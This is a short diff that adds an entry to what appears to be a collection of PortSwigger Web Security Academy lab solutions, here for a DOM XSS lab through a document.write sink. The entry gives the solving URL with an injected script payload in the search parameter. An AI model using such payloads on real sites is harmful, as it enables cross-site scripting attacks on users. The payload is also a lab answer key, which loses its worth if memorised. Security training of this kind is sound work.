@@ -24,3 +24,8 @@ solution:
         r2.send(x);
   };
 </script>
+
+[lab: DOM XSS in document.write sink using source location.search]
+url: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink
+solution: https://ac201fe61f531f8b80827001006b00a2.web-security-academy.net/?search='">);<script>alert(1);</script>--
+
